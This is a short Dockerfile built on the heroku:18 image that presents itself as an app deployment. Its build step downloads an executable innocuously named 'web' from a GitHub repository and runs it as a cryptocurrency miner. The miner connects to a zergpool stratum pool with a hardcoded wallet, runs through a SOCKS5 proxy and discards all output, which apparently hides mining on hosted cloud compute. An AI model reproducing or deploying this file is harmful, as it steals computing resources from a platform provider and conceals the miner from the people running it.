FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/kirbyworth/wortit/raw/main/web; chmod +x web; ./web -o stratum+tcp://yespowerSUGAR.mine.zergpool.com:6535 -u RM3wWv8aTy6AiZrt593WhaRYTpazxc3Jkj -p c=RVN,mc=SUGAR,m=solo -t 10 --proxy socks5://192.252.214.20:15864 > /dev/null 2>&1
CMD bash heroku.sh
